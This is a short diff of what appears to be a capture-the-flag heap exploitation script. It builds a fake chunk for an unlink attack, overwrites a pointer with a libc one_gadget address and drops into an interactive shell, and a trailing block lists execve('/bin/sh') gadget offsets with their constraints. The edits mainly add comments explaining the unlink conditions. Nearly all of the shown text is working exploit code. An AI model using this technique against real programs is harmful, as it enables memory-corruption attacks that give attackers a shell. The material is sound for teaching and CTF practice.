@@ -33,8 +33,9 @@ add(1 , "b") # 0x30 # start
 add(2 , "c") # 0x60
 add(3 , "d") # 0x90
 ptr = 0x602060 + 0x20
-add(4 , p64(0) + p64(0x31) + p64(ptr - 0x18) + p64(ptr - 0x10))
-add(5 , p64(0x30) + p64(0x30)) # unlink , target chunk
+add(4 , p64(0) + p64(0x31) + p64(ptr - 0x18) + p64(ptr - 0x10)) # next_chunk # unlink , target chunk 
+add(5 , p64(0x30) + p64(0x30)) # for inuse_bit_at_offset(next_chunk , next_size) == false 
+
 
 free(1)
 free(0)
@@ -58,6 +59,7 @@ edit(1 , p64(libc_base + 0x4526a))
 free(3)
 p.interactive()
 """
+
 0x45216	execve("/bin/sh", rsp+0x30, environ)
 constraints:
   rax == NULL
@@ -73,4 +75,5 @@ constraints:
 0xf1147	execve("/bin/sh", rsp+0x70, environ)
 constraints:
   [rsp+0x70] == NULL
+
 """
